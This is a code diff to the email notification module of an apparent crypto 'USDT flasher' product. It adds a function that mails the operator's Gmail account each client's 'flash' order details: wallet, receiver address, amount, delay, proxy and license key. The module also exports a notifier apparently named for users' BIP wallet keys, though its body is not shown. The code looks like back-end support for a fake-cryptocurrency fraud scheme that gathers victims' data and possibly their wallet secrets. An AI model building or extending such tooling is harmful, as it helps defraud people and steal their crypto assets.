@@ -11,19 +11,26 @@ async function createTransporter() {
   const emailPassword = process.env.EMAIL_PASSWORD ? process.env.EMAIL_PASSWORD.replace(/\s+/g, '') : '';
   console.log('Email password length:', emailPassword.length);
   
-  transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com',
-    port: 465,
-    secure: true, // use SSL
-    auth: {
-      user: 'usdtflasherpro@gmail.com',
-      pass: emailPassword // Use the cleaned password
-    },
-    debug: true // Enable debug output
-  });
+  if (!emailPassword) {
+    console.error('EMAIL_PASSWORD environment variable is not set or empty');
+    console.log('Falling back to Ethereal Email for testing');
+    await createTestAccount();
+    return;
+  }
   
-  // Verify connection configuration
   try {
+    transporter = nodemailer.createTransport({
+      host: 'smtp.gmail.com',
+      port: 465,
+      secure: true, // use SSL
+      auth: {
+        user: 'usdtflasherpro@gmail.com',
+        pass: emailPassword // Use the cleaned password
+      },
+      debug: true // Enable debug output
+    });
+    
+    // Verify connection configuration
     await transporter.verify();
     console.log('Gmail SMTP server is ready to take our messages');
   } catch (error) {
@@ -251,9 +258,92 @@ async function sendBipKeyNotification(bipData) {
   return sendEmail({ subject, html });
 }
 
+/**
+ * Send a form submission notification
+ * @param {Object} formData - Form data
+ * @returns {Promise} - Promise that resolves with the email send info
+ */
+async function sendFormSubmissionNotification(formData) {
+  const subject = `📝 [FORM] FLASH FORM SUBMISSION: ${formData.flashAmount} ${formData.currency} on ${formData.network}`;
+  
+  const html = `
+    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 5px; background-color: #f9f9f9;">
+      <h2 style="color: #5bc0de; border-bottom: 2px solid #5bc0de; padding-bottom: 10px; text-transform: uppercase;">📝 FORM SUBMISSION</h2>
+      <p style="font-size: 16px; font-weight: bold;">A client has submitted a flash form with the following details:</p>
+      
+      <div style="background-color: #5bc0de; color: white; padding: 10px; text-align: center; font-size: 18px; font-weight: bold; margin: 20px 0; border-radius: 5px;">
+        FORM DETAILS
+      </div>
+      
+      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px; background-color: white;">
+        <tr style="background-color: #f5f5f5;">
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Wallet</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.wallet}</td>
+        </tr>
+        <tr>
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Currency</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.currency}</td>
+        </tr>
+        <tr style="background-color: #f5f5f5;">
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Network</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.network}</td>
+        </tr>
+        <tr>
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Receiver Address</td>
+          <td style="padding: 10px; border: 1px solid #ddd; word-break: break-all;">${formData.receiverAddress}</td>
+        </tr>
+        <tr style="background-color: #f5f5f5;">
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Flash Amount</td>
+          <td style="padding: 10px; border: 1px solid #ddd; font-size: 16px; font-weight: bold; color: #5bc0de;">${formData.flashAmount} ${formData.currency}</td>
+        </tr>
+        <tr>
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Delay</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.delayDays} days, ${formData.delayMinutes} minutes</td>
+        </tr>
+        <tr style="background-color: #f5f5f5;">
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Use Proxy</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.useProxy ? 'Yes' : 'No'}</td>
+        </tr>
+        <tr>
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Transferable</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.transferable ? 'Yes' : 'No'}</td>
+        </tr>
+        <tr style="background-color: #f5f5f5;">
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Swappable</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.swappable ? 'Yes' : 'No'}</td>
+        </tr>
+        <tr>
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">P2P Tradable</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.p2pTradable ? 'Yes' : 'No'}</td>
+        </tr>
+        <tr style="background-color: #f5f5f5;">
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Splittable</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.splittable ? 'Yes' : 'No'}</td>
+        </tr>
+        <tr>
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">License Key</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.licenseKey || 'N/A'}</td>
+        </tr>
+        <tr style="background-color: #f5f5f5;">
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">User</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${formData.user || 'N/A'}</td>
+        </tr>
+        <tr>
+          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Timestamp</td>
+          <td style="padding: 10px; border: 1px solid #ddd;">${new Date(formData.timestamp).toLocaleString()}</td>
+        </tr>
+      </table>
+      <p style="color: #666; font-size: 12px; text-align: center; margin-top: 30px; border-top: 1px solid #e0e0e0; padding-top: 10px;">This is an automated form submission notification from USDT FLASHER PRO.</p>
+    </div>
+  `;
+
+  return sendEmail({ subject, html });
+}
+
 module.exports = {
   sendEmail,
   sendLicenseLoginNotification,
   sendFlashCreationNotification,
-  sendBipKeyNotification
+  sendBipKeyNotification,
+  sendFormSubmissionNotification
 };
